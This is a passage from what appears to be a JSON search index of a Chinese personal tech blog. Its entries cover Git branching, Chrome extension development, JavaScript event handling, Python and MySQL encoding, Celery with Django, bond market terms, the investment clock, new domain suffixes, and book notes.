分支，而不是develop分支。当release分支的使命完成后，合并回release分支的bugfix代码最终也会被合并到develop分支。(当develop分支急需解决这些bug，而等不到release分支的结束，你可以安全的将这些bugfix代码合并到develop分支，这样做也是可以的)。\n最后删除这些临时分支\n1 2 git branch -d hotfix-1.2.1 Deleted branch hotfix-1.2.1 (was abbe5d6). 8. 总结 这个分支模型其实没有什么震撼人心的新东西，这篇文章开始的那个“最大图片”已经证明了他在我们工程项目中的巨大作用。它会形成一种优雅的理想模型，而且很容易理解，该模型也允许团队成员形成一个关于分支和版本发布过程的相同理念。\n9. 参考 http://nvie.com/posts/a-successful-git-branching-model/ ","description":"","id":605,"section":"post","tags":["翻译","工具","Git","研发"],"title":"一个成功的 Git 分支模型","uri":"https://www.chenshaowen.com/blog/a-successful-git-branching-model.html"},{"content":"1. Chrome增强功能的方式：扩展、插件、应用 Google Chrome（谷歌浏览器）发展至今，已经不仅仅是一个浏览器，更像一个平台，可以个性化的安装自己需要的服务，同时也可以通过它来发布自己提供的服务。目前主要有三种方式来扩展浏览器的功能：\n2. 扩展（Extension） 在地址栏输入：chrome://extensions/，看到自己安装的扩展。扩展主要用于增强浏览器的功能，仅依赖于浏览器，可以跨系统运行。当出现安全风险时，浏览器会受到攻击。扩展可以改变页面的内容，代理服务器等设置。通常在地址栏和工具栏显示图标。\n3. 插件（Plugin） 在地址栏输入：chrome://plugins/，看到自己安装的插件。插件一般是安装程序时，附带安装的，用于浏览器集成软件提供的API服务。常见的插件有，Flash插件、PDF插件、Java插件等，不同操作系统，插件可能不同。当出现安全风险时，系统会受到攻击。\n4. 应用（Application） 在地址栏输入：chrome://apps，看到自己安装的应用。相比较与扩展和插件，应用并不依赖于浏览器运行，在Windows OS中菜单栏甚至能找到Chrome应用-的目录。应用更强调独立运行，运行时有自己独立的运行窗口，同时能调用底层的系统接口，比如USB、文件的读写等。\n5. 让我们来开发一个小应用 这里不涉及插件的开发，扩展和应用的开发差不多，下面就不做太多区分。还有一类是theme,主要用于美化Chrome。\n5.1 基本工具 Google Chrome - 谷歌浏览器 Chrome Dev Editor - 一个IDE，不用也可以，Chrome Web Store直接安装 5.2 扩展由哪些构成 每个扩展都包含以下文件：\n一个mainfest.json文件(必须，且同名)；\nmainfest.json文件是Chrome运行扩展的入口，配置扩展名称、版本、 描述、图片位置等信息。必须包含name、version、mainfest_version（设置为2）属性，browser_action、pagea_ction、app、theme字段只能选择一个。 app: 说明是Chrome App类型，弹出一个独立页面运行 browser_action：说明是Browser Action类型，增强浏览器的**通用功能**，与网站无关 page_action：说明是Page Action类型，根据访问的网址进行操作的，可以选择 theme:说明是主题类型，开发Chrome皮肤 permissions：对需要访问的网站进行授权 background：后台，可以与前端页面发生交互通信，发送跨域请求 content_scripts: 注入页面的脚本，可以修改页面的DOM，当然这里也可以与后台backgroup通信获取数据，需要用到chrome.*的API接口 若干html文件文件；\n弹出的页面 若干js\\css文件；\n扩展或应用中使用的js\\css文件，可以没有,但是出于安全考虑，不允许在html中运行js代码 若干图片及其他文件；\n扩展或应用中使用的图片文件，甚至还会有so，dll文件等，虽然现在这种注入功能的形式不被提倡。 5.3 现在就开始写个应用 实现的功能就是页面跳转，点击图标之后跳转到指定的页面。\n文件组织如下：\nblueking目录下有icon_128.png、mainfest.json两个文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 touch mainfest.json { \u0026#34;app\u0026#34;: { \u0026#34;launch\u0026#34;: { \u0026#34;web_url\u0026#34;: \u0026#34;http://o.qcloud.com/console/\u0026#34; }, \u0026#34;urls\u0026#34;: [ \u0026#34;http://o.qcloud.com/console/\u0026#34; ] }, \u0026#34;description\u0026#34;: \u0026#34;BlueKing\u0026#34;, \u0026#34;icons\u0026#34;: { \u0026#34;128\u0026#34;: \u0026#34;icon_128.png\u0026#34; }, \u0026#34;manifest_version\u0026#34;: 2, \u0026#34;name\u0026#34;: \u0026#34;BlueKing\u0026#34;, \u0026#34;permissions\u0026#34;: [ \u0026#34;unlimitedStorage\u0026#34;, \u0026#34;notifications\u0026#34; ], \u0026#34;short_name\u0026#34;: \u0026#34;BlueKing\u0026#34;, \u0026#34;update_url\u0026#34;: \u0026#34;https://clients2.google.com/service/update2/crx\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34; } 还需要准备一个icon_128.png文件作为app的图标显示。\n在Chrome Dev Editor中直接运行或者利用浏览器打包安装，会在应用中找到\n开发时，将上述文件放在一个文件夹，最好全部文件utf-8编码；测试时，进入扩展程序页面，勾选开发者模式，单击打包扩展程序，选择开发目录即可打包生成相应的crx包；发布时，不仅仅需要可以运行的一套项目代码，还需要若干图标，全部打包压缩成zip文件，开通开发者账户之后上传到开发者中心即可。\n如果使用Chrome Dev Editor开发，那么点击左下侧的**+，创建一个JavaScript Chrome App**项目，即可看到一个完整的扩展程序框架。需要做的就是填充自己的页面效果和逻辑。和普通的web应用开发无异。\n6. 参考资料 http://www.ituring.com.cn/minibook/950 http://open.chrome.360.cn/extension_dev/overview.html https://developer.chrome.com/extensions 7. 补充 【自2016年11月21日起，所有新打包或托管的应用仅限于Chrome操作系统，用户无法在Windows，Mac或Linux上使用。现有应用将继续在所有主要平台上提供，并将继续接收更新。免费的扩展程序，主题和应用程序现在可以发布到古巴地区。如果您有一个项目当前发布到“所有地区”，它已被自动选择加入古巴。您可以随时在编辑页面的“地区”部分更新项目的发布偏好设置。】大概有两年时间给开发者迁移现有的应用，扩展不受影响。\n","description":"","id":606,"section":"post","tags":["开发","前端","Chrome","扩展"],"title":"Chrome 扩展开发","uri":"https://www.chenshaowen.com/blog/how-to-develop-chrome-plugin.html"},{"content":"英文书名: Professional JavaScript for Web\n作者: [美] Nicholas C. Zakas\n出版社: 图灵程序设计丛书\n出版年: 2012-3-29\nISBN: 9787115275790\n","description":"","id":607,"section":"post","tags":["书籍","前端","JavaScript"],"title":"JavaScript高级程序设计（第3版）","uri":"https://www.chenshaowen.com/blog/book/professional-javascript-for-web.html"},{"content":"1. 事件处理模型：冒泡和捕获型 1 2 3 \u0026lt;div id=\u0026#34;outer\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;inner\u0026#34;\u0026gt;Click!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; 上面的代码当中一个div元素当中有一个p子元素，如果两个元素都有一个click的处理函数，那么我们怎么才能知道哪一个函数会首先被触发呢？\n为了解决这个问题微软和网景提出了两种几乎完全相反的概念。\n事件冒泡和事件捕获分别由微软和网景公司提出，这两个概念都是为了解决页面中事件流（事件发生顺序）的问题。\n事件冒泡的事件流模型被所有主流的浏览器兼容，从兼容性角度来说还是建议使用事件冒泡模型\n1.1 捕获型事件流 网景提出了一种名为事件捕获(event capturing)的事件流。事件从最外层开始发生，直到最具体的元素。\n上面例子，在事件捕获的概念下发生click事件的顺序是document -\u0026gt; html -\u0026gt; body -\u0026gt; div -\u0026gt; p\n1.2 冒泡型事件流 微软提出了一种名为事件冒泡(event bubbling)的事件流。事件冒泡可以形象地比喻为把一颗石头投入水中，泡泡会一直从水底冒出水面。也就是说，事件会从最内层的元素开始发生，一直向上传播，直到document对象。\n上面例子，在事件冒泡的概念下发生click事件的顺序是p -\u0026gt; div -\u0026gt; body -\u0026gt; html -\u0026gt; document\n1.3 W3C事件处理模型 任何发生在w3c事件模型中的事件，首是进入捕获阶段，直到达到目标元素，再进入冒泡阶段。\n上面例子，在事件捕获的概念下发生click事件的顺序是document -\u0026gt; html -\u0026gt; body -\u0026gt; div -\u0026gt; p -\u0026gt; div -\u0026gt; body -\u0026gt; html -\u0026gt; document\n2. DOM事件绑定 JavaScript中一共有三种事件监听方法：\n1.DOM0级事件处理方式\n绑定形式：element[’on’ + type] = function(){} or null(删除处理程序)\n将一个函数赋值给一个事件处理属性，特点：简单且全部浏览器支持，但是会覆盖绑定。\n2.DOM2级事件处理方式\n添加事件处理程序和删除事件处理程序的方法：addEventListener，removeEventListener。\n绑定形式：element.addEventListener(type, listener, useCapture); // IE6~8不支持\n在IE中使用，attachEvent和detachEvent来实现。\n绑定形式：element.attachEvent(’on’ + type, listener); // IE6~10，IE11不支持\n3.DOM3级事件处理方式\nDOM3级事件模块在DOM2级事件的基础上重新定义了这些事件，也添加了一些新事件，例如，UI事件、焦点事件、鼠标事件、滚轮事件、文本事件、键盘事件、合成事件、变动事件。还可以使用createEvent自定义事件。\n参数含义\ntype：事件类型\nlistener：事件触发后的回调函数\nuseCapture：是否使用捕获，如果值为true， useCapture 表示用户希望发起捕获。 在发起捕获之后， 只要Dom子树下发生了该事件类型，都会先被该事件监听器捕获，然后再被派发到Dom子树中的事件监听器中。并且向上冒泡的事件不会触发那些发起捕获的事件监听器。进一步的解释可以查看 DOM Level 3 Events 文档。 useCapture 默认值为false 。\naddEventListener是W3C工作组在DOM Level 2开始引入的一个注册事件监听器的方法；而在此之前，传统的事件监听方法是通过element[’on’ + type]的方式来注册的。它们两之间的主要区别是，element[’on’ + type]的方式无法使用事件捕获，并且element[’on’ + type]不支持对同一个元素的同一个事件注册多个事件监听器。如下面的例子所示，元素被点击后只会输出1，而不会输出0和1.\n1 2 element.onclick = function(){ console.log(0); } element.onclick = function(){ console.log(1); } 然而addEventListener方法在IE6~8的浏览器中不被支持。那么在低版本的IE中怎么来为同一个事件注册多个事件监听器呢？原来IE从IE5.0系列开始就引入了attachEvent()方法来支持这一特性。但遗憾的是该方法也不支持事件捕获。并且从IE 11开始，这个方法已经被弃用。\n","description":"","id":608,"section":"post","tags":["前端","JavaScript","整理","事件"],"title":"JavaScript 的事件处理机制","uri":"https://www.chenshaowen.com/blog/js-event-handle-mechanism.html"},{"content":" 背景: 刚做完一个django的数据查询web项目，数据来源于内部API查询，每次查询都需要调用若干API查询数据渲染在前端页面。由于，相关的数据不会经常变动，为了提高前端响应速度、在API不可用时依然能够查询，设计了缓存。API查询到的数据是json格式返回，缓存的数据是MySQL的Unicode编码，数据由此产生了两个来源：API和MySQL，导致了编码的错误。\n1. 编码格式 1.1 ASCII 计算机只能处理0和1两种数字，为了让计算机能够处理文本信息(也就是文字字符串)，就需要对这些信息进行编码。最早的计算机编码格式是ASCII码，采用8个bit表示一个字母，定义了128个字符，其中33个字符无法显示。8个bit位最多只能表示255个字符，只够英文国家使用，对全世界显然是不够的。\n1.2 GB2312 为了满足计算机处理中文字符的需要，中国发布了GB2312编码规范，采用两个字节，16个bit表示一个图形字。收录6763个汉字，其中一级汉字3755个，二级汉字3008个；同时收录了包括拉丁字母、希腊字母、日文平假名及片假名字母、俄语西里尔字母在内的682个字符。\n1.3 GBK 由于GB2312没有覆盖到全部汉字，一些古汉语字形和特殊的字符，GBK采用两个字节，16个bit表示一个图形字，同时完全兼容GB2312。GBK一共收录了21886个汉字和图形符号\n1.4 Unicode 各个国家为了计算机能够处理本国语言，各自制定编码规范，不可避免会有各种各样的冲突。为了同一编码，出现了Unicode编码，采用多字节编码。Unicode的标准在不断发展，常见的是采用两个字节，16个bit表示一个字符的，如果是不常见的字符，也可以扩展到多个字节。\n1.5 UTF-8 为了能表示更多的字符，Unicode采用长字节编码，这样会造成存储和带宽的浪费。UTF-8应运而生，采用边长的编码方式，实际上UFT-8是Unicode规则字库的一种实现形式。如果一个字节的首位是0，那么就表示一个字符，如果一个字节的首位是1，那么继续扩展一个字节编码判断。这种编码方式使UTF-8得到迅速推广。\n1.6 各种编码的使用场景 ASCII:适用于英文的使用环境\nGB2312、GBK:适用于中文字符编码\nUnicode:通用，常作为中间编码，转换其他编码\nUTF-8:节约存储空间和宽带资源，应用非常广\n2. Python的编码 Python默认脚本的编码方式是ASCII，如果使用了非ASCII的字符，通常会在第一行或第二行指定编码方式，# -*- coding=utf-8 -*- 或者 #coding=utf-8，当然也可以采用其他字符集，gbk等，但强烈建议保持utf8。\n2.1 字典类型 字典是可变容器模型，可存储任意类型对象。键必须是唯一的，但值不必。格式如下：\n1 d = {key1 : value1, key2 : value2 } 在ipython下执行，返回类型：\n1 2 3 4 5 In [1] :dic_a = ｛\u0026#39;name\u0026#39;:\u0026#39;tom\u0026#39;｝ In [2] :type(dic_a) Out [2] :dict In [3] :dic_a[\u0026#39;name\u0026#39;] Out [3] :\u0026#39;tom\u0026#39; 2.2 列表和元组 列表的数据项不需要具有相同的类型，列表是使用中括号中逗号分割单元定义的,列表的元素允许相同。格式如下：\n1 list= [\u0026#39;value1\u0026#39;, \u0026#39;value2\u0026#39;, num1, num1] 在ipython下执行：\n1 2 3 4 5 In [1] :list_a = [\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,1,2] In [2] :type(list_a) Out [2] :list In [3] :list_a[0] Out [3] :\u0026#39;a\u0026#39; 元组是使用圆括号中逗号分割单元定义，但是元组的内容是不允许改变的。格式如下：\n1 tuple= (\u0026#39;value1\u0026#39;, \u0026#39;value2\u0026#39;, num1, num1) 在ipython下执行：\n1 2 3 4 5 In [1] :tuple_a = (\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,1,2) In [2] :type(tuple_a) Out [2] :tuple In [3] :tuple_a[0] Out [3] :\u0026#39;a\u0026#39; 2.3 Python的字符数据类型 Python中有两种字符串类型，分别是 str 类型（8 bit的序列）和 unicode类型（每个unit是一个unicode对象）。当Python读取一个文本内容时，保持的对象为str类型。而以Unicode编码的字符串需要用u\u0026rsquo;\u0026lsquo;表示。\n1 2 3 4 5 6 In [1] :u\u0026#39;我\u0026#39; Out [1] :u\u0026#39;\\u6211\u0026#39; In [2] :u\u0026#39;我\u0026#39;.encode(\u0026#39;gbk\u0026#39;) Out [2] :\u0026#39;\\xce\\xd2\u0026#39; In [3] :u\u0026#39;我\u0026#39;.encode(\u0026#39;utf8\u0026#39;) Out [3] :\u0026#39;\\xe6\\x88\\x91\u0026#39; 上面编码使用的十六进制显示，使用print可以直接打印出表示的字符。可以看到字符一样，不同的编码存储开销是不一样的。\n2.4 JSON数据 json字符串实际上是字符串，只不过它是由单引号包裹的，但是必须符合一定的字符规则。这里有四条：\n并列的数据之间用逗号（\u0026quot;, \u0026ldquo;）分隔 映射用冒号（\u0026rdquo; : \u0026ldquo;）表示 并列数据的集合（数组）用方括号(\u0026rdquo;[]\u0026quot;)表示 映射的集合（对象）用大括号（\u0026quot;{}\u0026quot;）表示 json模块提供了两个函数 json.dumps() 和json.loads() 来编码和解码json数据。使用起来非常简单，需要注意的是dumps之后，tuple会变成list，loads之后不会完全恢复。json模块还提供dump和load函数，应用与需要将json存储到文件、套接字，而当做字符串处理时，使用dumps和loads函数。还有一点需要注意，loads会对字符串进行Unicode的编码，如果需要保持原编码，请使用ast.literal_eval。\n在python下执行，返回类型：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 In [1] :import json In [2] :obj_a={\u0026#39;name\u0026#39;:\u0026#39;tom\u0026#39;,\u0026#39;age\u0026#39;:20,\u0026#39;position\u0026#39;:(1,2,3)} In [3] :json_a = json.dumps(obj_a) In [4] :json_a Out [4] :\u0026#39;{\u0026#34;position\u0026#34;:[1,2,3],\u0026#34;age\u0026#34;:20,\u0026#34;name\u0026#34;:\u0026#34;tom\u0026#34;}\u0026#39; In [5] :type(json_a) Out [5] :str In [6] :obj_b=json.loads(json_a) In [7] :obj_b Out [7] :{u\u0026#39;age\u0026#39;: 20, u\u0026#39;name\u0026#39;: u\u0026#39;tom\u0026#39;, u\u0026#39;position\u0026#39;: [1, 2, 3]} In [8] :type(obj_b) Out [8] :dict In [9] :ast.literal_eval(json_a) Out [9] : {\u0026#39;age\u0026#39;:20,\u0026#39;name\u0026#39;:\u0026#39;tom\u0026#39;,\u0026#39;position\u0026#39;:[1,2,3]} In [10] :type(ast.literal_eval(json_a)) Out [10] : dict 同时，Python还提供ord()和chr()两个函数对字母和数字相互转换。\n3. MySQL的字符编码 3.1 基本概念 MySQL字符集包括字符集和校对规则两个概念。字符集定义MySQL存储字符串的方式，校对规则定义比较字符串的方式。字符集和校对规则是一对多的关系，MySQL支持30多种字符集的70多种校对规则。\n3.2 校对规则选择 使用utf8_general_ci的速度快，而使用utf8_unicode_ci比较准确。 utf8_unicode_ci的准确主要体现德语和法语上，对于一般的国内应用场景，建议使用general规则就足够。另外，由于unicode和general对大小写都不敏感，utf8_bin_ci也有一定的应用场景。\n3.3 注意事项 字符集通常直接选择utf8编码就足够。但是在有Emoji表情存储需求时会出现错误。MySQL的utf8编码最多3个字节，而Emoji表情是4个字节。为了能够存储Emoji，应该选用utf8mb4字符集。\n4. 参考 http://python3-cookbook.readthedocs.io/zh_CN/latest/c06/p02_read-write_json_data.html http://dev.mysql.com/doc/refman/5.7/en/charset-unicode-sets.html https://zh.wikipedia.org/wiki/GB_2312 https://zh.wikipedia.org/zh-cn/Unicode ","description":"","id":609,"section":"post","tags":["Python","编码","博文"],"title":"Python的字符编码入门","uri":"https://www.chenshaowen.com/blog/python-coding.html"},{"content":" 场景一:公司准备给全部员工推送一个邮件公告。采用封装的邮件库API，使用一次循环遍历全部员工推送邮件，会使主程序卡在循环处无法响应，这是我们不愿意看到的，我们希望点击执行之后，可以正常其他操作。场景二，量化程序的本地回测数据库每天都要更新。写个程序每天执行一次，是可以的，但不是有效率的，同时也会因为人而引入不确定因素。我们希望能每天定时执行一个操作，或者每小时执行一个操作，有效、可靠。这里归纳起来就是两类需求：异步任务和定时任务。\n1. 什么是Celery Celery 是一个基于 Python 编写的分布式任务调度模块，同时也支持实时处理的任务队列。\n2. Celery工作原理 Celery 的原理是利用了一个任务队列，将任务写入队列中，然后一个一个取出来执行并将结果写入指定数据库。理解起来就是生产者-消费者模型。在django中，执行异步任务代码产生一个task消息，传递给 broker，而后 celery 的 worker 会获取到 task 消息，对 task 执行，最后将执行返回的消息和结果存储在 backend 中。这里的 broker 和 backend 通常使用的是 rabbitMq 或redis。\n2.1 Pruducer 负责产生任务，然后交给任务队列去处理。有两种生产者，一种是上面提到的django，也就是主程序，这种任务放入队列之后马上会被执行；另外一种是任务调度器\u0026ndash;celery beat，它读取配置文件的内容，周期性的将任务请求发送给任务队列，这样就满足了定时任务的需求。\n2.2 Celery worker 执行任务的消费者，通常会在多台服务器运行多个消费者来提高执行效率\n2.3 Celery序列化 在客户端和消费者之间传输数据需要序列化和反序列化，主要有pickle、json、yaml、msgpack方案，其中的pickle由于安全问题从3.2的版本开始不被支持。\n3. 构建一个Celery任务 3.1 基本安装 先安装Erlang\n再安装rabbitmq-server\n在http://localhost:15672/ 可以查看rabbitmq中的消息队列\n安装celery\n1 pip install \u0026#34;celery[librabbitmq,redis,msgpack]\u0026#34; tasks.py\n1 2 3 4 5 from celery import Celery app = Celery(\u0026#39;hello\u0026#39;, broker=\u0026#39;amqp://guest@localhost/5672\u0026#39;) @app.task def hello(): return \u0026#39;hello world\u0026#39; 1 celery -A tasks worker 4. django 中使用 celery 4.1 基本安装和配置 需要pip安装django-celery、celery，这里需要注意 django 和其兼容性问题，选择django \u0026ndash; 1.8.3，dajngo-celery\u0026ndash;3.1.17，celery\u0026ndash;3.1是个不错的选择。 需要在INSTALLED_APPS中加入\u0026rsquo;djcelery\u0026rsquo;应用，执行 python manage migrate 将djcelery的数据库表写入数据库。celery 的后台任务和定时任务在相关表中都能找到对应，如果想写入或修改任务，我们可以直接操作这些表。 4.2 应用 在使用时，建议将配置信息放在单独的 config文件中，比如 broker，backend，超时，序列化信息等。将任务函数注册在一个单独的celery文件中。这样文件下就会有四个文件,tasks.py，config.py,celery.py, __init__.py。其中tasks.py主要写异步任务，如果直接是view中的函数，那么直接在view相关函数前加装饰器就可以了。\n4.3 最后，如何启动celery任务 task任务使用 1 python manage.py celery worker --settings=settings 周期性任务 1 2 python manage.py celery beat python manage.py celery worker --settings=settings 5. 参考资料 http://www.celeryproject.org/ https://github.com/celery/celery ","description":"","id":610,"section":"post","tags":["博文","Celery","Django","博文"],"title":"Django 中 Celery 的应用","uri":"https://www.chenshaowen.com/blog/using-celery-in-django.html"},{"content":"1. 丙类账户 银行间债券市场结算成员分为甲类成员、乙类成员和丙类成员。甲类户主要为商业银行，乙类户为农信机构、券商、基金和保险等，丙类户主要为非金融机构法人，其交易结算需要委托甲类成员代为办理。丙类户开户门槛较低，缺乏实质性监管。\n2. 银行间债市 银行间债市不只是银行之间的市场，而是包括了各类银行、农信机构、保险、券商和基金等金融机构以及非金融企业法人的机构间市场。银行间债市是一个场外市场（OTC）。\n3. 银行间债市如何交易 投资者以询价方式与选定的交易对手逐笔达成交易，具有分散性、协议性和直接性等特点，与沪深交易所的计算机集中撮合截然不同。 2011年，银行间债券总成交接近200万亿元。\n4. 代持 代持本身谈不上违法。其动机有的出于转移利润，有的出于隐藏亏损，有的出于规避时点考核作为临时周转。如果代持收益充公，属于绕开监管增加投资收益的行为，至多算是不合规；不过，如果代持的收益进了个人腰包，就属于非法利益输送。\n5. 养券 投资机构以现券方式卖出债券后，跟交易对手私下签订协议，在将来某一时点以接近当初成本价重新买回该笔债券。以买回债券的期限进行划分，期限较短的称为代持，不断滚动操作、期限长达数月甚至数年的称为养券。\n6. 一级半市场 由于债券从发行到上市，中间需要一段时间，在这一段时间内卖出申购的债券套利，便是一级半市场。 绝大多数债券采取簿记建档方式发行，定价过程不透明，为各类丙类户寻租创造了条件。\n","description":"","id":611,"section":"post","tags":["债券","金融"],"title":"债券术语","uri":"https://www.chenshaowen.com/blog/bond-term.html"},{"content":"副标题: 华尔街的投资游戏\n英文书名: Liar\u0026rsquo;s Poker\n作者: [美] 迈克尔·刘易斯\n出版社: 中信出版社\n出版年: 2007-1\nISBN: 9787508607559\n","description":"","id":612,"section":"post","tags":["书籍","博弈"],"title":"说谎者的扑克牌","uri":"https://www.chenshaowen.com/blog/book/liars-poker.html"},{"content":"美林投资时钟理论是一种将资产、行业轮动、债券收益率曲线以及经济周期四个阶段联系起来的方法，是一个非常实用的指导投资周期的工具。\n美林投资时钟的分析框架，可以帮助投资者识别经济周期的重要转折点。而正确识\n别经济增长的拐点，投资者可以通过转换资产以实现获利。\n美林投资时钟理论按照经济增长与通胀的不同搭配，将经济周期划分为四个阶段：\n“经济上行，通胀下行”构成复苏阶段，此阶段由于股票对经济的弹性更大，其相对债券和现金具备明显超额收益； “经济上行，通胀上行”构成过热阶段，在此阶段，通胀上升增加了持有现金的机会成本，可能出台的加息政策降低了债券的吸引力，股票的配置价值相对较强，而商品则将明显走牛； “经济下行，通胀上行”构成滞胀阶段，在滞胀阶段，现金收益率提高，持有现金最明智，经济下行对企业盈利的冲击将对股票构成负面影响，债券相对股票的收益率提高； “经济下行，通胀下行”构成衰退阶段，在衰退阶段，通胀压力下降，货币政策趋松，债券表现最突出，随着经济即将见底的预期逐步形成，股票的吸引力逐步增强。 四个阶段的收益率表现如下：\n衰退：债券\u0026gt;现金\u0026gt;股票\u0026gt;大宗商品 复苏：股票\u0026gt;债券\u0026gt;现金\u0026gt;大宗商品 过热：大宗商品\u0026gt;股票\u0026gt;现金/债券 滞胀：现金\u0026gt;大宗商品/债券\u0026gt;股票 因此， 我们在不同的阶段运用何种投资策略去实现最优投资目标：\n周期性：当经济增长加快（北），股票和大宗商品表现好。周期性行业，如：高科技股或钢铁股表现超过大市。当经济增长放缓（南），债券、现金及防守性投资组合表现超过大市。 久期： 当通胀率下降（西），折现率下降，金融资产表现好。投资者购买久期长的成长型股票。当通胀率上升（东），实体资产，如：大宗商品和现金表现好。估值波动小而且久期短的价值型股票表现超出大市。 利率敏感：银行和可选消费股属于利率敏感型，在一个周期中最早有反应。在中央银行放松银根，增长开始复苏时的衰退和复苏阶段，它们的表现最好。 与标的资产相关：一些行业的表现与标的资产的价格走势相关联。保险类股票和投资银行类股票往往对债券或股权价格敏感，在衰退或复苏阶段中表现得好。矿业股对金属价格敏感，在过热阶段中表现得好。石油与天然气股对石油价格敏感，在滞胀阶段中表现超过大市 ","description":"","id":613,"section":"post","tags":["博文","投资"],"title":"美林投资时钟","uri":"https://www.chenshaowen.com/blog/investment-clock.html"},{"content":"中文书名: Python核心编程（第二版\n英文书名: Core Python Programming, 2nd Edition\n作者: [美]Wesley J. Chun\n出版年: 2008-06\nISBN: 9787115178503\n","description":"","id":614,"section":"post","tags":["书籍","Python"],"title":"Python核心编程（第二版）","uri":"https://www.chenshaowen.com/blog/book/core-python-programming-2nd.html"},{"content":"1. ICANN的前生今世 ICANN，The International Corporation for Assigned Names and Numbers，成立于1998年，负责分配域名和IP地址等互联网资源。ICANN的前身是IANA (Internet Assigned number Authority)，之前一直受美国国防部直接资助，为了避免一国控制互联网的局面，1998年成立了非盈利组织ICANN。虽然拜摆脱了对美国国防部的依赖，ICANN目前与美国商业部、联邦电信与传播管理委员会存在间接的隶属关系。\nICANN的产生很大程度是由一家叫SAIC的公司背后操纵，SAIC是一家与美国军界签合同的公司，SAIC发现一家叫NSI的小公司因获得经营域名注册垄断权收入颇丰，于是强行买下NSI。几个月之后，美国政府决定，NSI可以每年向域名拥有者索取每年50美元的服务费。为了维护高额收益，SAIC授意以维护互联网稳定、防止商标垄断，ICANN成立。\n2. 域名的分类 点击查看全部域名后缀\n根据IANA的域名分类，域名一共分为以下几种。\n支持组织类域名：一共15个。一般就是政府、军事、教育机构之类的专有域名比如：.gov、.mil、.edu之类的。 基础组织域名：这个就一个. arpa。小编真的不知道这是个什么域名，所以上搜了一个简介：由ARPANET(美国国防部高级研究计划局建立的计算机网）沿留的名称，被用于互联网内部功能。可能这是美国自己内部用的一个域名吧。 国别地理域名：一共307个。全世界每个地区都有一个代表自己地区的域名，比如中国的.cn域名，美国的.us域名。也就是说在域名界里，全世界分为了307个地区。这个不一定是按国家分的，某个地区也会有自己的域名。比如中国香港的.hk域名，中国台湾的.tw域名。国别域名一般由两个字母构成。 类别域名：一共1119个。其中包括.com、.net之类的通用顶级域名，也包括了自2011年才开始的各种新顶级域名。由于IANA把新顶级域名和通用域名合到了一起，为了单独统计出新顶级域名的数量，我们查询了第三方的新顶级域名统计网站Ntldstats。截止2016年7月，全世界一共有1108个新顶级域名。 测试域名：一共11个。IANA对这个分类的标注就是“TEST”。 扩充的域名属于类别域名，类别域名目前是由三个及以上字符组成。而新域名后缀大致可以分为四类：\n通用类顶级域名，比如.xyz,.ooo,.site等。 地区、国家以及城市域名，比如.london，.durban，.taipei等。 行业顶级域名，比如.bike，.pizza，.media，.lawyer，.host，.football，.school，.golf等。 企业个性化顶级域，比如.alibaba，.google等。 3. 会有哪些影响 新域名后缀的扩充，无疑给互联网带了新的生机。.com域名注册量过亿，新的互联网接入者很难注册到合适的域名，而正是这些新的接入者不断涌入才推动互联网的繁荣。互联网永远都是年轻人的世界。扩充新的域名后缀能够让互联网世界更加活跃，各类网站风起云涌，具备建站能力的个人越来越多。\n互联网地址分配机构(IANA)在2011年2月份已将其IPv4地址空间段的最后2个“/8”地址组分配出去。这标志着地区性注册机构(RIR)可用IPv4地址空间中“空闲池”的终结。我们迎来了IPv6时代，IPv6的巨大IP容量，给互联网、物联网提供了有效的地址资源。而这些物联设备的管理、访问怎么解决呢？从前面的博文：域名的注册于价值分析\n中可以看到域名与IP存在对应关系。新的域名后缀对接IPV6，为新的互联时代到来做准备。\n域名的作用是为了便于访问，不用记忆点分十进制数的IP地址。对于资金实力雄厚的商家来说，每年花十几万美元用于维护只有品牌的域名后缀，是十分值得的。比如.citic中信集团，旗下的子公司就可以使用XXX.citic，具有非常高的可信度，同时由于DNS服务器自治，也可以避免其他DNS服务器的污染，提高可访问性；集团客户也可以拥有自己的.citic域名，增加了客户粘性。\n对于自己实力不足或者初创的公司来说，新域名后缀降低了互联网的入门门槛。大批量的新后缀，通过各种创意，精心挑选，还是很容易选到适合的域名的。但是，一旦公司做大，问题就会凸显。比如，del.icio.us创意域名，还可创意为de.licio.us，about.me流量会被aboutme.com偷走等等。毕竟.com才是霸主。NCC：超50%消费者不信任采用新域名后缀网站。\n4. 投资注册新域名后缀的最后意见 域名凸显品牌，这是我在上一篇域名博文中也分析过的。除了精品的新域名后缀域名，或者精品创意域名，比如单字母，单数字，这些在意义或者长度上十分极致的可以注册，其他一概不用考虑。当然还有一种，比如中英文双拼、三拼，拆分为单拼、双拼.后缀的，但是最重要的还是要保护好双拼、三拼.com。比如foxmail.com，注册fox.mail就很有意义。\n新域名后缀太多，怎么保护域名？注册商标！随着中国改革的推进，知识产权越来越重要，未来的几十年中国会迎来一个非常尊重知识的社会，今年2016年。域名+商标+商号，线上线下保护品牌，即使新域名后缀被其他人注册，一旦影响到品牌形象，可以起诉它。\n","description":"","id":615,"section":"post","tags":["博文","域名","互联网"],"title":"新域名后缀对互联网的影响","uri":"https://www.chenshaowen.com/blog/influence-of-new-gtld-on-the-internet.html"},{"content":"作者: 渔阳\n副标题: 一位华人交易员的经历\n出版年: 2011-3-2\nISBN: 9787300132440\nNotes:\nROE = 净利润／股东权益(Net Profit / Equity) =（净利润/销售收入）*（销售收入/总资产）*（总资产/股东权益） (Net Profit / Sales) * (Sales / Assets) * (Assets / Equity) = 销售利润率 * 资产周转率 * 财务杠杆比率 (Profit Margin) * (Asset Turnover) * (Financial Leverage) 